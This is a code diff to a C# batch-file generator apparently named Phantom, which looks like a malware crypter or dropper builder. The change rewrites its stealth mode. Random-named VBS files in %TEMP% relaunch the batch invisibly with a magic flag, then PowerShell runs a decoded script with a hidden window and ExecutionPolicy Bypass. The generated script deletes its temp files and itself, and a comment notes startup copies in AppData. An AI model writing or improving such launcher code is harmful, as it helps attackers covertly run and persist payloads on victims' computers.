@@ -16,18 +16,17 @@ namespace Phantom
             output.AppendLine("@echo off");
             output.AppendLine("setlocal enableextensions");
 
-            // VBS self-relaunch guard MUST come before admin check
-            // so hidden relaunches skip admin prompt entirely
-            string vbsFile = null;
+            string relaunchVbs = null;
+            string psVbs = null;
             string magicFlag = null;
             if (hidden)
             {
                 magicFlag = "_" + Utils.RandomString(3, rng) + "_";
-                vbsFile = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
+                relaunchVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
+                psVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
                 output.AppendLine($"if \"%1\"==\"{magicFlag}\" goto main");
-                output.AppendLine($"echo Set s = CreateObject(\"WScript.Shell\") > {vbsFile}");
-                output.AppendLine($"echo s.Run \"cmd /c \"\"%~f0\"\" {magicFlag} %*\", 0, False >> {vbsFile}");
-                output.AppendLine($"wscript //B {vbsFile} >nul 2>&1");
+                output.AppendLine($"echo CreateObject(\"Shell.Application\").ShellExecute \"cmd.exe\", \"/c \"\"%~f0\"\" {magicFlag} %*\", \"\", \"open\", 0 > {relaunchVbs}");
+                output.AppendLine($"wscript //B {relaunchVbs} >nul 2>&1");
                 output.AppendLine("exit /b");
                 output.AppendLine(":main");
             }
@@ -83,14 +82,26 @@ namespace Phantom
             else
                 psPath = "%systemdrive%\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
 
-            string hiddenFlag = hidden ? "-windowstyle hidden " : "";
-            output.AppendLine($"{psPath} -NoProfile {hiddenFlag}-ExecutionPolicy Bypass -File {ps1File} \"%~f0\" %*");
+            if (hidden)
+            {
+                string qq = "\"\"";
+                output.AppendLine($"set \"_b=%~f0\"");
+                output.AppendLine($"echo Set s = CreateObject(\"WScript.Shell\") > {psVbs}");
+                output.AppendLine($"echo s.Run \"{psPath} -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File {qq}{ps1File}{qq} {qq}%_b%{qq} %*\", 0, True >> {psVbs}");
+                output.AppendLine($"wscript //B {psVbs} >nul 2>&1");
+            }
+            else
+            {
+                output.AppendLine($"{psPath} -NoProfile -ExecutionPolicy Bypass -File {ps1File} \"%~f0\" %*");
+            }
 
             // Cleanup temp files
             output.AppendLine($"del {b64File} >nul 2>&1");
             output.AppendLine($"del {ps1File} >nul 2>&1");
-            if (vbsFile != null)
-                output.AppendLine($"del {vbsFile} >nul 2>&1");
+            if (relaunchVbs != null)
+                output.AppendLine($"del {relaunchVbs} >nul 2>&1");
+            if (psVbs != null)
+                output.AppendLine($"del {psVbs} >nul 2>&1");
 
             // Self-delete (skips startup copies in AppData)
             if (selfdelete)
